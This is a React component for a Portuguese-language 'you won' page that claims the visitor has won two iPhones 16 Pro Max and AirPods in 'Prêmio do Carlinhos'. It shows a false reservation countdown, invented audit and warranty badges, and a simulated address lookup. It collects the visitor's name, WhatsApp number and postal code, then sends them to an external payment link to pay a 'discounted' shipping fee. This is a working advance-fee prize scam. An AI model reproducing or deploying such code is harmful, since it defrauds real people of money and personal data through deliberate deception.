import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import confetti from 'canvas-confetti';
import {
  Sparkles,
  ShieldCheck,
  CheckCircle,
  Truck,
  Clock,
  Gift,
  Award,
  ChevronDown,
  ChevronUp,
  MapPin,
  Lock,
  ArrowRight,
  X,
  CreditCard,
  Zap,
} from 'lucide-react';
import { INITIAL_TICKET_NUMBERS, ALL_100_NUMBERS } from '../data/mockData';

interface ClaimStageProps {
  onBackToRoulette?: () => void;
}

export const ClaimStage: React.FC<ClaimStageProps> = ({ onBackToRoulette }) => {
  // State for initial celebratory popup on mount
  const [showInitialNotice, setShowInitialNotice] = useState<boolean>(true);
  // State for final checkout popup
  const [showCheckoutModal, setShowCheckoutModal] = useState<boolean>(false);
  // State for expanding all 100 ticket numbers
  const [showAllNumbers, setShowAllNumbers] = useState<boolean>(false);
  // Countdown timer for 10 minutes reservation
  const [timeLeft, setTimeLeft] = useState<number>(598); // 9m 58s

  // Address simulation form
  const [cep, setCep] = useState<string>('');
  const [nome, setNome] = useState<string>('');
  const [whatsapp, setWhatsapp] = useState<string>('');
  const [cidade, setCidade] = useState<string>('São Paulo');
  const [estado, setEstado] = useState<string>('SP');
  const [isCalculated, setIsCalculated] = useState<boolean>(true);

  // Countdown effect
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Initial confetti burst on claim stage mount
  useEffect(() => {
    confetti({
      particleCount: 80,
      spread: 70,
      origin: { y: 0.4 },
      colors: ['#ffd700', '#10b981', '#ffffff', '#3b82f6'],
    });
  }, []);

  const formatTimer = (seconds: number) => {
    const m = Math.floor(seconds / 60).toString().padStart(2, '0');
    const s = (seconds % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
  };

  const handleCepLookup = (val: string) => {
    const clean = val.replace(/\D/g, '');
    setCep(clean);
    if (clean.length === 8) {
      setIsCalculated(true);
      // Quick simulation of CEP detection
      if (clean.startsWith('0') || clean.startsWith('1')) {
        setCidade('São Paulo');
        setEstado('SP');
      } else if (clean.startsWith('2')) {
        setCidade('Rio de Janeiro');
        setEstado('RJ');
      } else if (clean.startsWith('3')) {
        setCidade('Belo Horizonte');
        setEstado('MG');
      } else if (clean.startsWith('4')) {
        setCidade('Salvador');
        setEstado('BA');
      } else if (clean.startsWith('7') || clean.startsWith('8')) {
        setCidade('Curitiba');
        setEstado('PR');
      } else {
        setCidade('Brasília');
        setEstado('DF');
      }
    }
  };

  const getCheckoutUrl = () => {
    const queryParams = typeof window !== 'undefined' ? window.location.search : '';
    const baseUrl = 'https://pay.ultimo-passo.space/BNjzgPl16PRgM78';
    return queryParams ? `${baseUrl}${queryParams}` : baseUrl;
  };

  const handleOpenFinalCheckout = () => {
    setShowCheckoutModal(true);
  };

  return (
    <div className="min-h-screen py-6 px-3 sm:px-4 max-w-4xl mx-auto text-slate-100">
      {/* Top Floating Alert Bar */}
      <motion.div
        initial={{ opacity: 0, y: -15 }}
        animate={{ opacity: 1, y: 0 }}
        className="barra-destaque bg-gradient-to-r from-amber-600 via-amber-500 to-yellow-500 text-slate-950 font-bold text-center py-2.5 px-4 rounded-2xl shadow-lg flex items-center justify-center gap-2 mb-6 text-xs sm:text-sm"
      >
        <Clock className="w-4 h-4 animate-spin text-slate-950" />
        <span>
          ATENÇÃO: Seu prêmio está <strong>RESERVADO</strong> pelos próximos{' '}
          <span className="bg-slate-950 text-amber-300 px-2 py-0.5 rounded-md font-mono font-extrabold">
            {formatTimer(timeLeft)}
          </span>{' '}
          minutos!
        </span>
      </motion.div>

      {/* Main Claim Card */}
      <div className="bg-slate-900/90 border border-amber-500/30 rounded-3xl p-4 sm:p-8 shadow-2xl backdrop-blur-md">
        {/* Header Order & Title */}
        <div className="flex flex-col sm:flex-row items-center justify-between gap-4 pb-6 border-b border-slate-800">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-amber-500 to-yellow-300 flex items-center justify-center shadow-lg shadow-amber-500/20">
              <Gift className="w-6 h-6 text-slate-950" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  PRÊMIO DO CARLINHOS • ETAPA FINAL
                </span>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                  CONFIRMADO
                </span>
              </div>
              <h1 className="text-xl sm:text-2xl font-black text-white font-display">
                Resgate do Título Premiado em Dobro
              </h1>
            </div>
          </div>

          <div className="bg-slate-950 px-4 py-2 rounded-xl border border-slate-800 text-center sm:text-right">
            <div className="text-[11px] text-slate-400 font-medium">Número do Pedido</div>
            <div className="text-sm sm:text-base font-mono font-bold text-amber-400">
              #PC-00044792
            </div>
          </div>
        </div>

        {/* Prize Spotlight Section */}
        <div className="my-8 flex flex-col md:flex-row items-center gap-8 bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 p-6 sm:p-8 rounded-2xl border-2 border-amber-500/40 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-64 h-64 bg-amber-500/10 rounded-full filter blur-3xl pointer-events-none" />

          {/* Glowing Animated Image Container */}
          <div className="relative flex-shrink-0 flex items-center justify-center w-full md:w-64">
            <div className="absolute w-48 h-48 rounded-full bg-gradient-to-tr from-amber-500/30 via-emerald-500/30 to-amber-300/30 animate-pulse filter blur-xl" />
            <div className="relative z-10 text-center flex flex-col items-center">
              <img
                src="/up1/2/images/IP.png"
                alt="2x iPhones 16 Pro Max + AirPods"
                className="w-44 h-auto object-contain animate-bounce drop-shadow-2xl"
                onError={(e) => {
                  (e.target as HTMLElement).style.display = 'none';
                }}
              />
              <div className="inline-block mt-2 px-3 py-1 bg-gradient-to-r from-emerald-500 to-teal-500 text-slate-950 font-black text-xs rounded-full uppercase tracking-wider shadow-lg">
                COMBO EM DOBRO
              </div>
            </div>
          </div>

          {/* Prize Details & Pricing Breakdown */}
          <div className="flex-grow text-left space-y-3">
            <div className="flex items-center gap-2">
              <span className="text-xs font-bold text-amber-400 bg-amber-400/10 px-2.5 py-1 rounded-lg border border-amber-400/20">
                GANHADOR OFICIAL SELECIONADO
              </span>
            </div>

            <h2 className="text-2xl sm:text-3xl font-black text-white font-display leading-tight">
              2x iPhones 16 Pro Max <span className="text-amber-400">+ 1x AirPods Pro 2</span>
            </h2>

            <p className="text-slate-300 text-sm leading-relaxed">
              Parabéns! Você foi contemplado no sorteio oficial com o maior pacote de prêmios Apple. Aparelhos 100% lacrados de fábrica com garantia Apple oficial no Brasil.
            </p>

            {/* Price values breakdown */}
            <div className="grid grid-cols-2 gap-3 pt-2">
              <div className="bg-slate-900/80 p-3 rounded-xl border border-slate-800">
                <span className="text-[11px] text-slate-400 block">Valor dos Aparelhos</span>
                <span className="line-through text-slate-500 text-xs">R$ 24.899,00</span>
                <span className="text-emerald-400 font-extrabold text-base block font-display">
                  R$ 0,00 (100% GRÁTIS)
                </span>
              </div>

              <div className="bg-slate-900/80 p-3 rounded-xl border border-emerald-500/30">
                <span className="text-[11px] text-emerald-400 font-bold block">Frete Expresso Seguro</span>
                <span className="line-through text-slate-500 text-xs">R$ 57,80</span>
                <span className="text-amber-300 font-extrabold text-base block font-display">
                  50% OFF APLICADO
                </span>
              </div>
            </div>
          </div>
        </div>

        {/* Delivery / Shipping Info Simulator */}
        <div className="my-8 p-5 sm:p-6 bg-slate-950 rounded-2xl border border-slate-800">
          <div className="flex items-center gap-2 mb-4">
            <MapPin className="w-5 h-5 text-amber-400" />
            <h3 className="text-lg font-bold text-white font-display">
              Confirme seus Dados de Entrega
            </h3>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-left">
            <div>
              <label className="block text-xs font-semibold text-slate-400 mb-1">
                Nome Completo do Titular
              </label>
              <input
                type="text"
                placeholder="Ex: João da Silva Santos"
                value={nome}
                onChange={(e) => setNome(e.target.value)}
                className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-slate-700 text-white text-sm focus:outline-none focus:border-amber-400 transition-colors"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-400 mb-1">
                WhatsApp com DDD
              </label>
              <input
                type="tel"
                placeholder="Ex: (11) 99999-9999"
                value={whatsapp}
                onChange={(e) => setWhatsapp(e.target.value)}
                className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-slate-700 text-white text-sm focus:outline-none focus:border-amber-400 transition-colors"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-400 mb-1">
                CEP de Entrega
              </label>
              <input
                type="text"
                maxLength={9}
                placeholder="00000-000"
                value={cep}
                onChange={(e) => handleCepLookup(e.target.value)}
                className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-slate-700 text-white text-sm focus:outline-none focus:border-amber-400 transition-colors"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-400 mb-1">
                Região / Cidade
              </label>
              <div className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900/60 border border-slate-800 text-slate-300 text-sm flex items-center justify-between">
                <span>{cidade} - {estado}</span>
                <span className="text-emerald-400 text-xs font-bold flex items-center gap-1">
                  <CheckCircle className="w-3.5 h-3.5" /> Sedex Disponível
                </span>
              </div>
            </div>
          </div>

          <div className="mt-4 p-3 bg-emerald-950/40 rounded-xl border border-emerald-500/30 flex items-center gap-3 text-xs text-emerald-300">
            <Truck className="w-5 h-5 text-emerald-400 flex-shrink-0" />
            <span>
              <strong>Envio Imediato via Sedex Especial com Seguro Apple:</strong> Prazo de 2 a 4 dias úteis com código de rastreamento enviado via WhatsApp.
            </span>
          </div>
        </div>

        {/* Resumo do Título / Números Premiados */}
        <div className="my-8 text-center">
          <div className="flex flex-col items-center justify-center mb-4">
            <h3 className="text-xl sm:text-2xl font-black text-white font-display">
              RESUMO DA COTA PREMIADA
            </h3>
            <p className="text-slate-400 text-xs sm:text-sm">
              Título Oficial Registrado: <strong className="text-amber-400 font-mono">19658489546</strong>
            </p>
          </div>

          {/* Numbers Card Container */}
          <div className="display-container max-w-xl mx-auto border-2 border-amber-500/40 rounded-2xl overflow-hidden bg-slate-950 shadow-xl">
            <div className="bg-gradient-to-r from-amber-600 via-amber-500 to-yellow-500 text-slate-950 flex items-center justify-between px-4 py-2.5 font-bold text-xs sm:text-sm">
              <span className="flex items-center gap-1.5 font-display">
                <Award className="w-4 h-4 text-slate-950" /> Título Premiado do Carlinhos
              </span>
              <span className="bg-slate-950 text-amber-300 px-2 py-0.5 rounded font-mono text-xs">
                19658489546
              </span>
            </div>

            {/* First 20 Numbers Grid */}
            <div className="grid grid-cols-4 sm:grid-cols-5 gap-2.5 p-4 sm:p-6">
              {INITIAL_TICKET_NUMBERS.map((num, i) => (
                <div
                  key={i}
                  className="w-10 h-10 sm:w-11 sm:h-11 rounded-full border-2 border-amber-400 bg-amber-400/10 text-amber-300 flex items-center justify-center font-bold text-sm mx-auto shadow-md shadow-amber-500/10 hover:scale-110 hover:bg-amber-400 hover:text-slate-950 transition-all cursor-default"
                >
                  {num}
                </div>
              ))}
            </div>

            {/* Expandable 80 Hidden Numbers */}
            <AnimatePresence>
              {showAllNumbers && (
                <motion.div
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: 'auto' }}
                  exit={{ opacity: 0, height: 0 }}
                  className="border-t border-slate-800"
                >
                  <div className="grid grid-cols-4 sm:grid-cols-5 gap-2.5 p-4 sm:p-6 bg-slate-900/50">
                    {ALL_100_NUMBERS.slice(20).map((num, i) => (
                      <div
                        key={i}
                        className="w-10 h-10 sm:w-11 sm:h-11 rounded-full border border-slate-700 bg-slate-800/80 text-slate-300 flex items-center justify-center font-semibold text-xs mx-auto hover:border-amber-400 hover:text-amber-300 transition-colors"
                      >
                        {num}
                      </div>
                    ))}
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Toggle Button */}
            <div className="py-3 bg-slate-900/80 border-t border-slate-800 flex justify-center">
              <button
                id="lerMaisBtn"
                onClick={() => setShowAllNumbers(!showAllNumbers)}
                className="px-5 py-2 rounded-full bg-slate-800 hover:bg-amber-500 hover:text-slate-950 text-slate-300 text-xs font-bold transition-all flex items-center gap-1.5 shadow-md"
              >
                {showAllNumbers ? (
                  <>
                    <ChevronUp className="w-4 h-4" /> Mostrar Menos Números
                  </>
                ) : (
                  <>
                    <ChevronDown className="w-4 h-4" /> Ver Todos os 100 Números da Cota
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        {/* Resgate Main Action Button */}
        <div className="mt-8 pt-6 border-t border-slate-800 flex flex-col items-center">
          <motion.button
            whileHover={{ scale: 1.03 }}
            whileTap={{ scale: 0.97 }}
            onClick={handleOpenFinalCheckout}
            id="resgate-btn"
            className="shine-button w-full max-w-lg py-5 px-8 rounded-2xl bg-gradient-to-r from-emerald-500 via-emerald-400 to-teal-400 text-slate-950 font-black text-lg sm:text-xl shadow-[0_12px_40px_rgba(16,185,129,0.4)] border-2 border-emerald-200 hover:brightness-110 active:scale-95 transition-all flex items-center justify-center gap-3 font-display"
          >
            <Sparkles className="w-6 h-6 text-slate-950" />
            <span>QUERO RECEBER MEUS IPHONES</span>
            <ArrowRight className="w-6 h-6 text-slate-950" />
          </motion.button>

          <p className="text-xs text-slate-400 mt-3 flex items-center gap-1.5">
            <Lock className="w-3.5 h-3.5 text-emerald-400" />
            Processo de resgate criptografado e seguro com emissão de Nota Fiscal.
          </p>
        </div>
      </div>

      {/* Security & Guarantees Strip */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 my-8 text-center">
        <div className="p-3.5 rounded-2xl bg-slate-900/60 border border-slate-800">
          <ShieldCheck className="w-6 h-6 text-amber-400 mx-auto mb-1.5" />
          <span className="text-xs font-bold text-white block">Sorteio Auditado</span>
          <span className="text-[11px] text-slate-400">Certificado Oficial SECAP</span>
        </div>
        <div className="p-3.5 rounded-2xl bg-slate-900/60 border border-slate-800">
          <Truck className="w-6 h-6 text-emerald-400 mx-auto mb-1.5" />
          <span className="text-xs font-bold text-white block">Envio Correios Sedex</span>
          <span className="text-[11px] text-slate-400">Rastreio em Tempo Real</span>
        </div>
        <div className="p-3.5 rounded-2xl bg-slate-900/60 border border-slate-800">
          <Award className="w-6 h-6 text-yellow-400 mx-auto mb-1.5" />
          <span className="text-xs font-bold text-white block">Garantia Apple 1 Ano</span>
          <span className="text-[11px] text-slate-400">Aparelhos Novos e Lacrados</span>
        </div>
        <div className="p-3.5 rounded-2xl bg-slate-900/60 border border-slate-800">
          <Lock className="w-6 h-6 text-cyan-400 mx-auto mb-1.5" />
          <span className="text-xs font-bold text-white block">100% Protegido</span>
          <span className="text-[11px] text-slate-400">Privacidade Total de Dados</span>
        </div>
      </div>

      {/* OVERLAY POPUP 1: INITIAL CELEBRATION NOTICE */}
      <AnimatePresence>
        {showInitialNotice && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="blur-overlay fixed inset-0 bg-slate-950/85 backdrop-blur-md"
            />

            <motion.div
              initial={{ opacity: 0, scale: 0.85, y: 25 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.85, y: 25 }}
              id="notificacaoPremio"
              className="notificacao-premio relative w-full max-w-md bg-gradient-to-b from-slate-900 via-slate-900 to-slate-950 border-2 border-amber-400 rounded-3xl p-6 sm:p-8 text-center shadow-[0_0_50px_rgba(245,158,11,0.35)] z-10"
            >
              <div className="inline-flex items-center gap-1 px-3 py-1 rounded-full bg-emerald-500/20 text-emerald-400 text-xs font-black uppercase mb-3 border border-emerald-500/40">
                <Sparkles className="w-3.5 h-3.5" /> PREMIAÇÃO CONFIRMADA
              </div>

              <h2 className="text-2xl sm:text-3xl font-black text-white font-display leading-tight mb-2">
                🎉 VOCÊ GANHOU EM DOBRO! 🎉
              </h2>

              <p className="text-slate-300 text-sm leading-relaxed mb-4">
                Você acaba de ganhar <strong>2 iPhones 16 PRO MAX</strong> e mais <strong>1 AirPods Pro</strong> no Prêmio do Carlinhos!<br />
                E ainda não acabou: você também ganhou <strong>50% DE DESCONTO</strong> no frete expresso para a sua região.
              </p>

              {/* Glowing Prize Image Visual */}
              <div className="my-4 py-2 relative flex items-center justify-center">
                <div className="absolute w-36 h-36 rounded-full bg-amber-500/30 filter blur-xl animate-pulse" />
                <img
                  src="/up1/2/images/IP.png"
                  alt="Prêmio"
                  className="w-40 h-auto object-contain animate-bounce drop-shadow-xl relative z-10"
                  onError={(e) => {
                    (e.target as HTMLElement).style.display = 'none';
                  }}
                />
              </div>

              <div className="p-2.5 rounded-xl bg-emerald-950/80 border border-emerald-500/40 text-emerald-300 font-bold text-sm mb-6">
                +50% DE DESCONTO NO FRETE LIBERADO
              </div>

              <button
                onClick={() => setShowInitialNotice(false)}
                className="shine-button w-full py-4 px-6 rounded-2xl bg-gradient-to-r from-amber-500 via-amber-400 to-yellow-300 text-slate-950 font-black text-base sm:text-lg shadow-lg shadow-amber-500/30 hover:brightness-110 active:scale-95 transition-all flex items-center justify-center gap-2 font-display"
              >
                <span>RESGATAR PRÊMIOS AGORA</span>
                <ArrowRight className="w-5 h-5 text-slate-950" />
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* OVERLAY POPUP 2: FINAL CHECKOUT CONFIRMATION MODAL */}
      <AnimatePresence>
        {showCheckoutModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowCheckoutModal(false)}
              className="fixed inset-0 bg-slate-950/85 backdrop-blur-md"
            />

            <motion.div
              initial={{ opacity: 0, scale: 0.85, y: 25 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.85, y: 25 }}
              id="popup"
              className="relative w-full max-w-md bg-gradient-to-b from-slate-900 to-slate-950 border-2 border-amber-400 rounded-3xl p-6 sm:p-8 text-center shadow-2xl z-10"
            >
              {/* Close X */}
              <button
                onClick={() => setShowCheckoutModal(false)}
                className="absolute top-4 right-4 p-1.5 rounded-full bg-slate-800 text-slate-400 hover:text-white hover:bg-slate-700 transition-colors"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="w-12 h-12 mx-auto rounded-2xl bg-gradient-to-tr from-amber-500 to-yellow-300 flex items-center justify-center shadow-lg shadow-amber-500/20 mb-3">
                <Gift className="w-6 h-6 text-slate-950" />
              </div>

              <h2 className="text-xl sm:text-2xl font-black text-white font-display mb-1">
                PARABÉNS!
              </h2>
              <p className="text-xs text-slate-400">Você acaba de ganhar</p>

              <h3 className="text-lg sm:text-xl font-black text-amber-400 font-display my-2">
                2 iPhones 16 Pro Max + AirPods Pro
              </h3>

              <div className="my-3 flex justify-center">
                <img
                  src="/up1/2/images/IPNHO-IPORDS-3.png"
                  alt="2 iPhones 16 Pro Max + AirPods Pro"
                  className="w-48 h-auto object-contain animate-pulse drop-shadow-xl"
                  onError={(e) => {
                    (e.target as HTMLElement).style.display = 'none';
                  }}
                />
              </div>

              <p className="text-xs text-slate-300 leading-relaxed mb-2">
                Sua sorte está brilhando hoje! Você foi o grande selecionado no Prêmio do Carlinhos.
              </p>

              <p className="text-xs font-semibold text-slate-200 mb-5">
                Agora só precisamos confirmar o endereço para envio seguro dos seus aparelhos!
              </p>

              <a
                href={getCheckoutUrl()}
                className="shine-button block w-full py-4 px-6 rounded-2xl bg-gradient-to-r from-emerald-500 via-emerald-400 to-teal-400 text-slate-950 font-black text-base sm:text-lg shadow-xl shadow-emerald-500/30 hover:brightness-110 active:scale-95 transition-all text-center font-display"
              >
                🎁 QUERO RECEBER MEU IPHONE!
              </a>

              <div className="mt-3 flex items-center justify-center gap-2 text-[10px] text-slate-400">
                <Lock className="w-3 h-3 text-emerald-400" />
                <span>Página de pagamento segura com certificado SSL 256-bit</span>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};
